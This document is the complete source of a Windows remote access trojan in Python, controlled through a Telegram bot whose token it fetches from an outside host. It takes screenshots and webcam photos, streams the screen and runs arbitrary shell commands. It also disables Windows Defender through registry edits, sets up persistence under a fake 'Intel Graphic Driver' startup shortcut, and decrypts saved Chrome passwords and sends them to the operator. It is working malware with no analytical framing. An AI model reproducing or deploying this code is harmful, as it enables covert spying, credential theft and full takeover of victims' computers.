import os
import subprocess
import requests
import pyautogui
import cv2
import ctypes
import threading
import time
import json
import base64
import sqlite3
import sys
from datetime import datetime, timedelta
import shutil
from Crypto.Cipher import AES
import win32crypt
from telebot import TeleBot
import platform
import pythoncom
from win32com.client import Dispatch

# URL to fetch the token
TOKEN_URL = "https://ishinders.me/token"

def get_token():
    """Fetch the Telegram bot token from the specified URL."""
    try:
        response = requests.get(TOKEN_URL, timeout=10)
        response.raise_for_status()
        return response.text.strip()
    except Exception as e:
        print(f"Error fetching token: {e}")
        return None

BOT_TOKEN = get_token()
if not BOT_TOKEN or " " in BOT_TOKEN:
    print("Invalid token fetched. Exiting...")
    exit(1)

bot = TeleBot(BOT_TOKEN)

# Global state
keylogging_active = False
screen_sharing_active = False

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@bot.message_handler(commands=['help'])
def help(message):
    """Send the help message with a list of available commands."""
    help_text = """
✨ *Available Commands*:
/help - Show this help message 📚
/ss - Take a screenshot 📸
/wm - Take a webcam photo 🎥
/cmd <command> - Execute a command 🖥️
/ds - Disable security software (requires admin) 🔒
/sss - Start screen sharing 🔁
/ssst - Stop screen sharing ⏹️
/creds - Retrieve saved credentials 🔑
/ps - Add persistence to the bot (requires admin) 📂
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['ps'])
def add_persistence(message):
    """Add the script to the startup programs for persistence."""
    try:
        if platform.system() != "Windows":
            raise NotImplementedError("Persistence is only implemented for Windows.")

        pythoncom.CoInitialize()
        
        # Get the startup folder path
        startup_path = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
        # Check if the program is running as an .exe
        if getattr(sys, 'frozen', False):
            # Running as an .exe
            script_path = sys.executable
        else:
            # Running as a script
            script_path = os.path.abspath(__file__)
        
        # Path for the shortcut
        shortcut_path = os.path.join(startup_path, "Intel Graphic Driver.lnk")

        # Create the shortcut
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.Save()

        bot.reply_to(message, "✅ Persistence added successfully! The bot will now start on system boot.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error adding persistence: {e}")

@bot.message_handler(commands=['ss'])
def take_screenshot(message):
    """Take a screenshot and send it to the user."""
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove('screenshot.png')
        bot.reply_to(message, "📸 Screenshot taken and sent!")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error taking screenshot: {e}")

@bot.message_handler(commands=['wm'])
def take_webcam_photo(message):
    """Capture a photo from the webcam and send it to the user."""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            with open('webcam.jpg', 'rb') as img:
                bot.send_photo(message.chat.id, img)
            os.remove('webcam.jpg')
        cap.release()
        bot.reply_to(message, "🎥 Webcam photo taken and sent!")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error taking webcam photo: {e}")

@bot.message_handler(commands=['cmd'])
def execute_command(message):
    """Execute a shell command and return the output."""
    try:
        command = ' '.join(message.text.split()[1:])
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr or "✅ Command executed successfully with no output."
        bot.reply_to(message, f"🖥️ Command output:\n```\n{output[:4000]}\n```", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error executing command: {e}")

@bot.message_handler(commands=['ds'])
def disable_security(message):
    """Disable security software (requires admin privileges)."""
    try:
        if not is_admin():
            bot.reply_to(message, "⚠️ This command requires admin privileges. Please run as administrator.")
            return
        
        bot.reply_to(message, "🔒 Disabling security features...")

        commands = [
            r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SpyNetReporting /t REG_DWORD /d 0 /f',
            r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f',
        ]
        for cmd in commands:
            subprocess.run(cmd, shell=True)

        bot.reply_to(message, "✅ Security features disabled! Please restart your system for changes to take effect.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error disabling security features: {e}")

@bot.message_handler(commands=['sss'])
def start_screen_sharing(message):
    """Start screen sharing by sending screenshots periodically."""
    global screen_sharing_active
    screen_sharing_active = True
    bot.reply_to(message, "🔁 Screen sharing started. Sending screenshots every second.")
    threading.Thread(target=send_screenshots, args=(message.chat.id,)).start()

@bot.message_handler(commands=['ssst'])
def stop_screen_sharing(message):
    """Stop screen sharing."""
    global screen_sharing_active
    screen_sharing_active = False
    bot.reply_to(message, "⏹️ Screen sharing stopped.")

def send_screenshots(chat_id):
    """Send screenshots at regular intervals."""
    while screen_sharing_active:
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            with open('screenshot.png', 'rb') as img:
                bot.send_photo(chat_id, img)
            os.remove('screenshot.png')
            time.sleep(1)
        except Exception as e:
            print(f"Error in screen sharing: {e}")

@bot.message_handler(commands=["creds"])
def handle_creds(message):
    """Fetch and send Chrome credentials."""
    db_path = os.path.join(
        os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", 
        "User Data", "Default", "Login Data"
    )
    temp_db = "temp_chrome_data.db"

    try:
        # Copy database to a temporary location
        shutil.copyfile(db_path, temp_db)
        key = get_encryption_key()

        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        rows = cursor.fetchall()
        conn.close()  # Ensure connection is closed before file deletion

        # Extract credentials
        credentials = [
            f"Site: {row[0]}\nUsername: {row[1]}\nPassword: {decrypt_password(row[2], key)}\nCreated: {chrome_time_to_datetime(row[3]) if row[3] else 'Unknown'}"
            for row in rows if row[1] or row[2]
        ]

        # Send response
        response = "\n\n".join(credentials) or "No credentials found."
        bot.reply_to(message, response[:4000])

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)  # Ensure no process is using the file
            except Exception as cleanup_error:
                print(f"Error during cleanup: {cleanup_error}")

def chrome_time_to_datetime(microseconds):
    """Convert Chrome's timestamp to a human-readable format."""
    return datetime(1601, 1, 1) + timedelta(microseconds=microseconds)

def get_encryption_key():
    """Retrieve Chrome's encryption key."""
    state_path = os.path.join(
        os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State"
    )
    with open(state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    """Decrypt Chrome's stored password."""
    try:
        iv = encrypted_password[3:15]
        password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode("utf-8")
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
        except:
            return "N/A (Logged in with Social Account)"

if __name__ == '__main__':
    if not is_admin():
        print("⚠️ Please run this script as Administrator!")
    bot.polling()
